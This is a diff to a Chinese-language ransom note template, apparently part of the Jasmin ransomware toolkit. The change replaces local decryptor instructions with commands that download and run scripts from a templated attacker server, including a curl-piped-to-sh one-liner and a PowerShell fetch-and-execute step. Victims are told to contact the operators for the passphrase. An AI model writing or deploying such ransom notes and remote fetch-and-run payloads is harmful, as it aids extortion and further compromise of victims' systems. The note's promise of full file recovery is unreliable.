@@ -17,19 +17,14 @@
 
 🔓 解密方法:
 
-  【Windows 解密】
-  1. 运行 Jasmin_Decryptor.exe
-  2. 选择 .pem 私钥文件
-  3. 点击 Decrypt，所有文件将自动恢复
+  【Windows 解密】需 PowerShell 7+
+  curl.exe -sL {{SERVER_URL}}/payloads/jasmin_unlock.ps1 -o unlock.ps1
+  pwsh -File unlock.ps1 -Server {{SERVER_URL}} -K "<解密口令>" -Paths C:\目标目录
 
-  【Linux 解密】
-  1. pip3 install cryptography
-  2. python3 jasmin_decrypt.py private_key.pem
-  3. 指定目录: python3 jasmin_decrypt.py key.pem /home /var
+  【Linux / macOS 解密】纯 openssl，无需安装任何依赖
+  curl -sL {{SERVER_URL}}/payloads/jasmin_unlock.sh | sh -s {{SERVER_URL}} "<解密口令>" <目标目录>
 
-  【macOS 解密】
-  1. pip3 install cryptography
-  2. python3 jasmin_decrypt.py private_key.pem
+  解密口令与目标目录请通过下方联系方式索取。
 
 ✅ SHA-256 完整性校验确保每个文件100%还原至原始状态。
 
